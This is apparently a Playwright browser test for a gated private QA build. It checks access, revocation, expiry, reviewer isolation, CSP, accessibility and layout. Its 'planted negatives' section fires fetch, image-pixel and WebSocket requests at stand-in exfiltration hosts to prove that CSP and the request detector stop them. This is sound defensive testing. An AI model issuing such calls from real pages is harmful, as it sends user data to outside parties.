// QA01 browser contract: a committed synthetic review build, served through the real gate on loopback,
// in Chromium or Linux WebKit (MR_WEBKIT=1). Not a physical-iPhone result.
//
//   node scripts/qa/build.mjs --out /tmp/qa-build && QA_BUILD_DIR=/tmp/qa-build node tests/security/private-qa-browser.mjs
//
// Checks: access/expiry/revocation in the browser, reviewer namespaces, canonical draft/model/usage/
// Send/Stop behaviour on the synthetic transport, every request the browser attempts, CSP, service
// workers, page errors, overflow and axe — plus planted negatives proving the request detector works.

import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { chromium, webkit } from 'playwright';
import AxeBuilder from '@axe-core/playwright';
import { startLocalGate, REVIEWERS } from './private-qa-local-gate.mjs';
import { verifyBuild } from '../../scripts/qa/verify.mjs';

const buildDir = process.env.QA_BUILD_DIR;
assert.ok(buildDir, 'Set QA_BUILD_DIR to the output of scripts/qa/build.mjs');
const head = execFileSync('git', ['rev-parse', 'HEAD'], { encoding: 'utf8' }).trim();
const problems = await verifyBuild(buildDir, process.env.QA_EXPECTED_COMMIT || head);
assert.deepEqual(problems, [], 'build must match its manifest and commit before it is served');

const engine = process.env.MR_WEBKIT ? webkit : chromium;
const engineName = process.env.MR_WEBKIT ? 'webkit' : 'chromium';
const VIEWPORTS = [[1440, 960], [390, 844], [320, 568], [390, 480]];
let now = Date.now();
const gate = await startLocalGate(buildDir, { clock: () => now });
const browser = await engine.launch();
const results = [];

async function open(who, { width = 390, height = 844, bypassCSP = false } = {}) {
  const phone = width < 900;
  const context = await browser.newContext({ viewport: { width, height }, isMobile: phone && engineName === 'chromium', hasTouch: phone, bypassCSP,
    extraHTTPHeaders: who ? { 'Cf-Access-Jwt-Assertion': await gate.token(who) } : {} });
  // `external` lists requests that left the page for another origin. A request the browser itself refused
  // under CSP (Chromium still reports it, failed with ERR_BLOCKED_BY_CSP) never reached the network.
  const seen = { requests: [], attempts: new Map(), errors: [], get external() { return [...this.attempts].filter(([, failure]) => !/BLOCKED_BY_CSP/i.test(failure || '')).map(([url]) => url); } };
  context.on('request', (request) => {
    const url = request.url();
    seen.requests.push(url);
    if (!url.startsWith(gate.origin) && !/^(data|blob):/.test(url)) seen.attempts.set(url, null);
  });
  context.on('requestfailed', (request) => { if (seen.attempts.has(request.url())) seen.attempts.set(request.url(), request.failure()?.errorText || 'failed'); });
  // Anything leaving the loopback gate would be a failure; abort it so nothing is ever delivered.
  await context.route((url) => !url.href.startsWith(gate.origin), (route) => route.abort('blockedbyclient'));
  await context.addInitScript(() => {
    window.__cspViolations = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__cspViolations.push({ directive: e.effectiveDirective, blocked: String(e.blockedURI).slice(0, 80) }));
  });
  const page = await context.newPage();
  page.on('pageerror', (error) => seen.errors.push(error.message));
  return { context, page, seen };
}

const composer = (page) => page.getByRole('textbox', { name: 'Message', exact: true });
const settle = (page, ms = 250) => page.waitForTimeout(ms);
async function overflow(page) { return page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth); }

try {
  // 1. Access: no identity, wrong identity, then the permitted reviewer.
  {
    const anonymous = await open(null);
    const response = await anonymous.page.goto(gate.buildUrl);
    assert.equal(response.status(), 401);
    assert.ok(!(await anonymous.page.content()).includes('<script'), 'no app bytes without identity');
    await anonymous.context.close();
    const stranger = await open(REVIEWERS.stranger);
    assert.equal((await stranger.page.goto(gate.buildUrl)).status(), 403);
    await stranger.context.close();
  }

  for (const [width, height] of VIEWPORTS) {
    const { context, page, seen } = await open(REVIEWERS.owner, { width, height });
    const response = await page.goto(gate.buildUrl);
    assert.equal(response.status(), 200);
    assert.equal(response.headers()['cache-control'], 'private, no-store');
    await composer(page).waitFor({ timeout: 20000 });
    await page.getByText(/^Synthetic review · no live provider requests/).waitFor();
    const account = await page.evaluate(() => JSON.parse(localStorage.getItem('mr.preview_user') || '{}').uid);
    assert.match(account, /^preview-qa-[0-9a-f]{32}$/);

    // Canonical draft + selection survive the real model picker and usage meter.
    const draft = 'Line one of a synthetic draft\nLine two — ünïcode ✓';
    await composer(page).fill(draft);
    await page.locator('.composer textarea').evaluate((t) => t.setSelectionRange(5, 12, 'backward'));
    await page.locator('.composer .model-button').click();
    const picker = page.getByRole('dialog', { name: 'Choose a model', exact: true });
    await picker.waitFor();
    assert.ok((await picker.getByRole('option').count()) >= 3, 'Auto, Layout and synthetic models are offered');
    await page.keyboard.press('Escape');
    await picker.waitFor({ state: 'hidden' });
    await page.locator('.composer .usage-chip').click();
    await page.getByRole('dialog', { name: 'Usage', exact: true }).waitFor();
    await page.getByRole('button', { name: 'Close usage', exact: true }).click();
    assert.equal(await composer(page).inputValue(), draft);

    // Send → synthetic streamed reply; then a slow reply stopped by the real Stop button.
    await composer(page).fill(`Hello from ${width}px`);
    await page.getByRole('button', { name: 'Send', exact: true }).click();
    await page.getByText(/No live provider was contacted/).last().waitFor({ timeout: 20000 });
    await page.getByRole('button', { name: 'Send', exact: true }).or(page.getByRole('button', { name: 'Start voice conversation', exact: true })).first().waitFor();
    const repliesBefore = await page.locator('.msg.assistant').count();
    await composer(page).fill('[synthetic:slow] please write slowly');
    await page.getByRole('button', { name: 'Send', exact: true }).click();
    await page.getByRole('button', { name: 'Stop', exact: true }).click();
    await settle(page, 1500);
    const repliesAfter = await page.locator('.msg.assistant').count();
    assert.equal(repliesAfter, repliesBefore + 1, 'Stop leaves exactly one (partial) reply and sends nothing again');
    assert.equal(await page.getByRole('button', { name: 'Stop', exact: true }).count(), 0);

    // Surfaces reachable without leaving the device.
    if (width >= 900) {
      for (const name of ['Library', 'Tools']) {
        await page.locator('.sidebar').getByRole('button', { name, exact: true }).first().click();
        await settle(page, 400);
        assert.ok((await overflow(page)) <= 0, `${name} overflow at ${width}`);
        await page.keyboard.press('Escape');
      }
    }

    const state = await page.evaluate(async () => ({
      blockedHosts: window.__qaBlockedHosts || [], disabledCalls: window.__qaDisabledCalls || [], csp: window.__cspViolations || [],
      workers: navigator.serviceWorker ? (await navigator.serviceWorker.getRegistrations()).length : 0,
    }));
    const axe = await new AxeBuilder({ page }).withTags(['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa']).analyze();
    results.push({ viewport: `${width}x${height}`, requests: seen.requests.length, external: seen.external, errors: seen.errors, overflow: await overflow(page),
      axe: axe.violations.map((v) => ({ id: v.id, nodes: v.nodes.length })), ...state });
    assert.deepEqual(seen.external, [], 'no request may leave the review origin');
    assert.deepEqual(state.blockedHosts, [], 'normal review flows need no blocked host');
    assert.deepEqual(state.csp, [], 'normal review flows trigger no CSP violation');
    assert.equal(state.workers, 0, 'no service worker registered');
    assert.deepEqual(seen.errors, []);
    assert.ok((await overflow(page)) <= 0, `no horizontal overflow at ${width}`);
    assert.deepEqual(axe.violations.map((v) => v.id), [], `axe at ${width}x${height}`);
    await context.close();
  }

  // 2. Planted negatives: forbidden requests from page context are blocked by CSP, and the detector
  //    itself is proven by a deliberately unprotected (CSP-bypassed) context whose request it must catch.
  {
    const { context, page, seen } = await open(REVIEWERS.owner);
    await page.goto(gate.buildUrl);
    await composer(page).waitFor({ timeout: 20000 });
    const planted = await page.evaluate(async () => {
      const outcome = {};
      try { await fetch('https://planted-exfiltration.invalid/collect'); outcome.fetch = 'sent'; } catch { outcome.fetch = 'blocked'; }
      new Image().src = 'https://planted-pixel.invalid/p.png';
      try { new WebSocket('wss://planted-socket.invalid/'); outcome.socket = 'opened'; } catch { outcome.socket = 'blocked'; }
      try { await navigator.serviceWorker?.register('./sw.js'); outcome.sw = 'registered'; } catch { outcome.sw = 'blocked'; }
      await new Promise((r) => setTimeout(r, 400));
      return { ...outcome, csp: window.__cspViolations.map((v) => v.directive) };
    });
    assert.equal(planted.fetch, 'blocked');
    assert.notEqual(planted.sw, 'registered');
    assert.ok(planted.csp.some((d) => d === 'connect-src') && planted.csp.some((d) => d === 'img-src'), `CSP reported the planted requests: ${planted.csp}`);
    assert.deepEqual(seen.external, [], 'CSP stopped planted requests before the network');
    results.push({ plantedAttemptsRefusedByCsp: [...seen.attempts].map(([url, failure]) => ({ url, failure })) });
    await context.close();

    const control = await open(REVIEWERS.owner, { bypassCSP: true });
    await control.page.goto(gate.buildUrl);
    await composer(control.page).waitFor({ timeout: 20000 });
    await control.page.evaluate(() => fetch('https://planted-detector-check.invalid/x').catch(() => null));
    await settle(control.page, 300);
    assert.ok(control.seen.external.some((u) => u.includes('planted-detector-check.invalid')), 'the request detector must catch a planted external request');
    await control.context.close();
    results.push({ planted, detectorControl: 'caught' });
  }

  // 3. Reviewer/build namespaces: a second reviewer starts from fixtures and cannot see the owner's draft.
  {
    const owner = await open(REVIEWERS.owner);
    await owner.page.goto(gate.buildUrl);
    await composer(owner.page).waitFor({ timeout: 20000 });
    await composer(owner.page).fill('OWNER_ONLY_DRAFT');
    await settle(owner.page, 600);
    const ownerUid = await owner.page.evaluate(() => JSON.parse(localStorage.getItem('mr.preview_user')).uid);
    const storageState = await owner.context.storageState();
    await owner.context.close();
    // Same browser profile (shared origin storage), different reviewer identity.
    const second = await browser.newContext({ storageState, extraHTTPHeaders: { 'Cf-Access-Jwt-Assertion': await gate.token(REVIEWERS.second) } });
    const page = await second.newPage();
    await page.goto(gate.buildUrl);
    await composer(page).waitFor({ timeout: 20000 });
    const secondUid = await page.evaluate(() => JSON.parse(localStorage.getItem('mr.preview_user')).uid);
    assert.notEqual(secondUid, ownerUid);
    assert.equal(await composer(page).inputValue(), '', 'another reviewer does not inherit the draft');
    assert.equal(await page.getByText('OWNER_ONLY_DRAFT').count(), 0);
    await second.close();
    results.push({ namespaces: 'separate' });
  }

  // 4. Revoking a reviewer locks their open page on its next check; reload is refused.
  {
    const { context, page } = await open(REVIEWERS.second);
    await page.goto(gate.buildUrl);
    await composer(page).waitFor({ timeout: 20000 });
    await composer(page).fill('UNSENT_AFTER_END');
    await gate.revoke({ reviewer: REVIEWERS.second });
    await page.evaluate(() => window.dispatchEvent(new Event('focus')));
    await page.getByRole('alertdialog', { name: 'Review ended' }).waitFor({ timeout: 10000 });
    assert.equal(await page.locator('#root').evaluate((r) => r.inert), true);
    const reload = await page.reload();
    assert.equal(reload.status(), 403, 'removed reviewer is refused on reload');
    assert.ok(!(await page.content()).includes('<script'));
    await context.close();
    results.push({ revokeReviewer: 'locked and refused' });
  }

  // 5. Expiry: the next reply is refused, the page locks, and reload is refused.
  {
    const { context, page } = await open(REVIEWERS.owner);
    await page.goto(gate.buildUrl);
    await composer(page).waitFor({ timeout: 20000 });
    now = gate.manifest.expiresAt;
    await composer(page).fill('[synthetic:slow] after expiry');
    await page.getByRole('button', { name: 'Send', exact: true }).click();
    await page.getByRole('alertdialog', { name: 'Review ended' }).waitFor({ timeout: 10000 });
    assert.equal(await page.getByText(/No live provider was contacted.*after expiry/).count(), 0, 'no reply is produced after expiry');
    assert.equal((await page.reload()).status(), 410);
    await context.close();
    results.push({ expire: 'send refused, locked and reload refused' });
  }

  console.log(JSON.stringify({ engine: engineName, build: gate.buildId, results }, null, 2));
  console.log(`PASS private QA browser contract (${engineName}): ${VIEWPORTS.length} viewports, planted negatives, namespaces, revocation, expiry`);
} finally {
  await browser.close();
  await gate.close();
}
